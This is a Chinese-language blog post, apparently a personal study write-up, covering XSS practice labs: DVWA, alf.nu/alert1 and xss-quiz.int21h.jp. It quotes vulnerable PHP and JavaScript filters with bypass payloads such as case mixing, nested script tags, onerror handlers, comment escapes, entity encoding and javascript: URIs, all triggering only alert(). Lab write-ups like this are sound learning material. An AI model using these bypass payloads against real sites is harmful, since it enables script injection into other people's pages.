{"title":"XSS 学习","slug":"xss备忘","date":"2019-12-25T12:56:41.000Z","updated":"2020-04-29T05:44:51.496Z","comments":true,"path":"api/articles/xss备忘.json","photos":[],"link":"","excerpt":null,"covers":null,"content":"<h1 id=\"xss备忘\"><a href=\"#xss备忘\" class=\"headerlink\" title=\"xss备忘\"></a>xss备忘</h1><p>11/1/2019 10:50:21 AM </p>\n<h2 id=\"DVWA\"><a href=\"#DVWA\" class=\"headerlink\" title=\"DVWA\"></a>DVWA</h2><h3 id=\"reflected\"><a href=\"#reflected\" class=\"headerlink\" title=\"reflected\"></a>reflected</h3><p><strong>low</strong></p>\n<pre><code>&lt;script&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>medium</strong></p>\n<pre><code>&lt;scRiPt&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>&lt;?php\n\nheader (&quot;X-XSS-Protection: 0&quot;);\n\n// Is there any input?\nif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) {\n    // Get input\n    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );\n\n    // Feedback for end user\n    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;\n}\n\n?&gt; </code></pre><p>黑名单过滤，采用正则不区分大小写，双写、大小写混淆不行了，但是我们可以使用其他的事件标签：</p>\n<pre><code>&lt;img src onerror=alert(1);&gt;&gt;</code></pre><p><strong>impossible</strong></p>\n<pre><code>&lt;?php \n// Is there any input? \nif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { \n    // Check Anti-CSRF token \n    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); \n    // Get input \n    $name = htmlspecialchars( $_GET[ &apos;name&apos; ] ); \n    // Feedback for end user \n    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; \n} \n// Generate Anti-CSRF token \ngenerateSessionToken(); \n?&gt;</code></pre><h2 id=\"Stored\"><a href=\"#Stored\" class=\"headerlink\" title=\"Stored\"></a>Stored</h2><p><strong>low</strong></p>\n<p>name 处长度限制， Message 处尝试 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code></p>\n<p><strong>medium</strong></p>\n<pre><code>$message = strip_tags( addslashes( $message ) );\n$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n$message = htmlspecialchars( $message );\n\n// Sanitize name input\n$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );\n$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p><code>strip_tages</code> 移除字符串中的 HTML、XML 以及 PHP 标签，但允许使用 <code>&lt;b&gt;</code> 标签。  <code>addslashes</code>  返回在预定义字符(单引号、双引号、反斜杠、NULL)之前添加反斜杠的字符串； <code>htmlspecialchars</code> 对参数进行实体编码，无法再对 <code>message</code> 进行 XSS ，但是 <code>name</code> 处可以通过修改长度进行 xss。</p>\n<pre><code>&lt;sc&lt;script&gt;ript&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>$message = strip_tags( addslashes( $message ) );\n$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n$message = htmlspecialchars( $message );\n\n// Sanitize name input\n$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );\n$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p>似曾相识呢😋</p>\n<pre><code>&lt;img src onerror=alert(1);&gt;</code></pre><p><strong>impossible</strong></p>\n<pre><code>&lt;?php \nif( isset( $_POST[ &apos;btnSign&apos; ] ) ) { \n    // Check Anti-CSRF token \n    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); \n    // Get input \n    $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); \n    $name    = trim( $_POST[ &apos;txtName&apos; ] ); \n    // Sanitize message input \n    $message = stripslashes( $message ); \n    $message = mysql_real_escape_string( $message ); \n    $message = htmlspecialchars( $message ); \n    // Sanitize name input \n    $name = stripslashes( $name ); \n    $name = mysql_real_escape_string( $name ); \n    $name = htmlspecialchars( $name ); \n    // Update database \n    $data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; ); \n    $data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR ); \n    $data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR ); \n    $data-&gt;execute(); \n} \n// Generate Anti-CSRF token \ngenerateSessionToken(); \n?&gt;</code></pre><h3 id=\"DOM\"><a href=\"#DOM\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><p><strong>low</strong>    </p>\n<pre><code>?default=English&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><strong>medium</strong></p>\n<pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {\n    $default = $_GET[&apos;default&apos;];\n\n    # Do not allow script tags\n    if (stripos ($default, &quot;&lt;script&quot;) !== false) {\n        header (&quot;location: ?default=English&quot;);\n        exit;\n    }\n} </code></pre><p>过滤了 <code>&lt;script</code> ,观察页面源码，手动闭合事件标签 <code>&lt;/option&gt;</code> 、 <code>&lt;/select&gt;</code>，由于代码只检测 <code>$default</code> ,于是我们后面的代码可以逃逸。</p>\n<p>payload:</p>\n<pre><code>?default=English&gt;1&lt;/option&gt;&lt;/select&gt;&lt;img src onerror=alert(1)&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {\n\n    # White list the allowable languages\n    switch ($_GET[&apos;default&apos;]) {\n        case &quot;French&quot;:\n        case &quot;English&quot;:\n        case &quot;German&quot;:\n        case &quot;Spanish&quot;:\n            # ok\n            break;\n        default:\n            header (&quot;location: ?default=English&quot;);\n            exit;\n    }\n}</code></pre><p>URL 中所有在 # 之后的都会被分割，不会发送到服务端，因此不会被过滤，恶意代码会在创建页面时被用来渲染<br>读取页面内容。</p>\n<p>payload:</p>\n<pre><code>?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>浏览器如何渲染一个页面，找到一篇国外的文章：<a href=\"https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969\" target=\"_blank\" rel=\"noopener\">https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969</a></p>\n<p>HTML事件属性：<a href=\"https://www.w3school.com.cn/tags/html_ref_eventattributes.asp\" target=\"_blank\" rel=\"noopener\">https://www.w3school.com.cn/tags/html_ref_eventattributes.asp</a></p>\n<h1 id=\"下面是另一个-xss-靶场\"><a href=\"#下面是另一个-xss-靶场\" class=\"headerlink\" title=\"下面是另一个 xss 靶场\"></a>下面是另一个 xss 靶场</h1><p>靶场地址：<a href=\"https://alf.nu/alert1\" target=\"_blank\" rel=\"noopener\">https://alf.nu/alert1</a></p>\n<h2 id=\"Warmup\"><a href=\"#Warmup\" class=\"headerlink\" title=\"Warmup\"></a>Warmup</h2><pre><code>function escape(s) {\n  return &apos;&lt;script&gt;console.log(&quot;&apos;+s+&apos;&quot;);&lt;/script&gt;&apos;;\n}</code></pre><p>对输入的值没有过滤直接拼接到字符串中，闭合前面的标签即可</p>\n<pre><code>1&quot;);alert(1)//    &lt;script&gt;console.log(&quot;1&quot;);alert(1)//&quot;);&lt;/script&gt;\n1&quot;);alert(1,&quot;     &lt;script&gt;console.log(&quot;1&quot;);alert(1,&quot;&quot;);&lt;/script&gt;</code></pre><h2 id=\"Adobe\"><a href=\"#Adobe\" class=\"headerlink\" title=\"Adobe\"></a>Adobe</h2><pre><code>function escape(s) {\n  s = s.replace(/&quot;/g, &apos;\\\\&quot;&apos;);\n  return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;;\n}</code></pre><p>对输入的 <code>&quot;</code> 加了一个转义，但是我们可以闭合 <code>&lt;script&gt;</code> 标签，或者用 <code>\\</code> 再次转义</p>\n<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//        &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1)//&quot;);&lt;/script&gt;\n\n&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;     &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;);&lt;/script&gt;\n\n\\&quot;);alert(1)//                     &lt;script&gt;console.log(&quot;\\\\&quot;);alert(1)//&quot;);&lt;/script&gt;</code></pre><h2 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a>JSON</h2><pre><code>function escape(s) {\n  s = JSON.stringify(s);\n  return &apos;&lt;script&gt;console.log(&apos; + s + &apos;);&lt;/script&gt;&apos;;\n}</code></pre><p>与第二题一样</p>\n<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//</code></pre><h3 id=\"Markdown\"><a href=\"#Markdown\" class=\"headerlink\" title=\"Markdown\"></a>Markdown</h3><pre><code>function escape(s) {\n  var text = s.replace(/&lt;/g, &apos;&amp;lt;&apos;).replace(/&quot;/g, &apos;&amp;quot;&apos;);\n  // URLs\n  text = text.replace(/(http:\\/\\/\\S+)/g, &apos;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&apos;);\n  // [[img123|Description]]\n  text = text.replace(/\\[\\[(\\w+)\\|(.+?)\\]\\]/g, &apos;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&apos;);\n  return text;\n}</code></pre><p>第一行过滤将所有 <code>&lt; &quot;</code> 进行实体编码</p>\n<p>第二行将所有 <code>http://S+</code> 替换为 <code>&lt;a href=&quot;https://S+&quot;&gt;htp://S+&lt;/a&gt;</code> ,这里 S+ 为匹配一个非空白字符一次或多次。</p>\n<p>第三行将 <code>[[a|b]]</code> 替换为 <code>&lt;img alt=&quot;b&quot; src=&quot;a.gif&quot;&gt;</code></p>\n<p>payload: <code>[[a|http://onerror=alert(1)//]]</code></p>\n<p>输出：</p>\n<pre><code>&lt;img alt=&quot;&lt;a href=&quot;http://onerror=alert(1)//&quot; src=&quot;a.gif&quot;&gt;&quot;&gt;http://onerror=alert(1)//]]&lt;/a&gt;</code></pre><p>通过 <code>http://onerror=alert(1)//</code> 引入 <code>alt=&quot;***&quot;</code> ,此时引号内的内容触发第二行的检测 替换为<code>&lt;a href=&quot;http://onerror=alert(1)//&quot;&gt;http://onerror=alert(1)//&lt;/a&gt;</code> 此时 <code>href</code> 带来的 <code>&quot;</code> 将 <code>alt</code> 的引号闭合，同时 <code>//</code> 将后面的代码注释掉，造成 <code>http://onerror=alert(1)</code> 逃逸出来。</p>\n<h3 id=\"DOM-1\"><a href=\"#DOM-1\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><pre><code>function escape(s) {\n  // Slightly too lazy to make two input fields.\n  // Pass in something like &quot;TextNode#foo&quot;\n  var m = s.split(/#/);\n\n  // Only slightly contrived at this point.\n  var a = document.createElement(&apos;div&apos;);\n  a.appendChild(document[&apos;create&apos;+m[0]].apply(document, m.slice(1)));\n  return a.innerHTML;\n}</code></pre><p>通过 <code>split</code> 对传入的 s 进行分割<br>    var s=”creat#foo”; var m=s.split(/#/); m<br>    Array [ “creat”, “foo” ]</p>\n<pre><code>document[&apos;create&apos;+m[0]].apply(document, m.slice(1)) </code></pre><p>相当于调用了 document.creatXXX() ,这里有几个常用的创建 DOM 节点方法</p>\n<pre><code>createElement() 创建一个元素节点\ncreateTextNode() 创建一个文本节点\ncreateAttribute() 创建一个属性节点\ncreateComment() 创建一个注释节点</code></pre><p>测试最后一个：</p>\n<pre><code>document.createComment(11111);\n&lt;!-- 11111 --&gt;</code></pre><p>Payload: 闭合注释</p>\n<pre><code>Comment#&gt;&lt;iframe onload=alert(1)            &lt;!--&gt;&lt;iframe onload=alert(1)--&gt;</code></pre><h2 id=\"Skandia\"><a href=\"#Skandia\" class=\"headerlink\" title=\"Skandia\"></a>Skandia</h2><pre><code>function escape(s) {\n  return &apos;&lt;script&gt;console.log(&quot;&apos; + s.toUpperCase() + &apos;&quot;)&lt;/script&gt;&apos;;\n}</code></pre><p>对输入的 s 全部变成大写，直接输入 <code>alert</code> 变成 <code>ALERT</code> 之后无法执行。</p>\n<p>利用 HTML 编码绕过</p>\n<pre><code>&lt;/script&gt;&lt;img src onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</code></pre><p>关于浏览器如何处理编码，贴一篇大佬博客：<a href=\"http://bobao.360.cn/learning/detail/292.html\" target=\"_blank\" rel=\"noopener\">http://bobao.360.cn/learning/detail/292.html</a></p>\n<h2 id=\"Callback\"><a href=\"#Callback\" class=\"headerlink\" title=\"Callback\"></a>Callback</h2><h1 id=\"http-xss-quiz-int21h-jp\"><a href=\"#http-xss-quiz-int21h-jp\" class=\"headerlink\" title=\"http://xss-quiz.int21h.jp\"></a><a href=\"http://xss-quiz.int21h.jp\" target=\"_blank\" rel=\"noopener\">http://xss-quiz.int21h.jp</a></h1><h2 id=\"Stage-3\"><a href=\"#Stage-3\" class=\"headerlink\" title=\"Stage 3\"></a>Stage 3</h2><p>先尝试 <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code></p>\n<p>查看源码发现被转义成</p>\n<pre><code>aaa&amp;lt;bbb&amp;gt;ccc/ddd&amp;#039;eee&amp;quot;fff;ggg:hhh</code></pre><p>看起来无法成功了，但是旁边还有个下拉栏，我们抓包试试修改第二个参数：</p>\n<pre><code>p1=Lodan&amp;p2=&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p>It works! 这一关只是防御了第一个栏位，以后要多留心类似的。</p>\n<h2 id=\"Stage-4\"><a href=\"#Stage-4\" class=\"headerlink\" title=\"Stage 4\"></a>Stage 4</h2><p>看起来和第三关一样，仍然是先测试，发现被转义，抓包发现多了一个参数 p3 ，首先对新参数进行测试，修改成 <code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code> 发包发现还是失败，查看源码之后与第二关一样闭合 <code>&quot;&gt;</code> 即可。</p>\n<h2 id=\"Stage-5\"><a href=\"#Stage-5\" class=\"headerlink\" title=\"Stage 5\"></a>Stage 5</h2><p>还是先测试： <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> </p>\n<p>发现只显示了一段，<code>F12</code> ，修改长度再测</p>\n<p>没有过滤。</p>\n<p>好了，修改长度，直接插入吧！ </p>\n<p>试完没成功，再看看源码，原来是没闭合 <code>value</code> ，手动闭合提交：</p>\n<p>stage5 的作用只是想告诉我们 <strong>客户端的防护是无效的</strong></p>\n<h2 id=\"Stage-6\"><a href=\"#Stage-6\" class=\"headerlink\" title=\"Stage 6\"></a>Stage 6</h2><p>还是先测试： <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> , <code>&lt; &gt;</code>被转义，而且没有其他的我们可以控制的栏位，这怎么搞？</p>\n<p>答案是用 html 语法，XSS不是只能插入 JS ，还可以使用 HTML 语法，不用 <code>&lt;&gt;/</code> 利用事件触发</p>\n<pre><code>&quot; onclick=alert(document.domain); &quot;</code></pre><h2 id=\"Stage-7\"><a href=\"#Stage-7\" class=\"headerlink\" title=\"Stage 7\"></a>Stage 7</h2><p>还是先测试： <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> ,这次连 <code>&quot;</code> 都转移了</p>\n<p>还是使用 html 语法，使用空格分割属性，加入一个 <code>&quot;</code> 来结束前面的语句</p>\n<h2 id=\"Stage-8\"><a href=\"#Stage-8\" class=\"headerlink\" title=\"Stage 8\"></a>Stage 8</h2><p>还是先测试： <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> , 这次是将输入插入到超链接里，我们直接插入</p>\n<pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p>行不通，因为我们点链接发现是 <code>404</code> ，换成 <code>JavaScript</code> 试试</p>\n<pre><code>javascript:alert(document.domain);</code></pre><p>插入后点击链接：</p>\n<h2 id=\"Stage-9\"><a href=\"#Stage-9\" class=\"headerlink\" title=\"Stage 9\"></a>Stage 9</h2><p>不支持 UTF-7 编码，所以跳过</p>\n<h2 id=\"Stage-10\"><a href=\"#Stage-10\" class=\"headerlink\" title=\"Stage 10\"></a>Stage 10</h2><h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><blockquote>\n<p><a href=\"https://blog.davidh83110.com/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/10/xss.html\" target=\"_blank\" rel=\"noopener\">https://blog.davidh83110.com/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/10/xss.html</a></p>\n</blockquote>\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"XSS","slug":"XSS","count":1,"path":"api/tags/XSS.json"}]}